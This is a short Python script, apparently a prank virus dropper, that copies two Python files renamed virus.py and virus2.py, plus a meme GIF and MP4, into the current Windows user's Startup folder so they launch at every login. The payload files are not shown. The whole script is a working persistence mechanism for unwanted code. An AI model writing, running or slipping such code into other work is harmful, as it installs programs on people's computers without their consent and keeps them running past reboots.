import os
import shutil
thicc = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus.py')
thicc2 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus2.py')
thicc3 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','henrystickmin.gif')
thicc4 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','chungus.mp4')
shutil.copy('Framework1.py',thicc)
shutil.copy('Framework2.py',thicc2)
shutil.copy('chungus.mp4',thicc4)
shutil.copy('henrystickmin.gif',thicc3)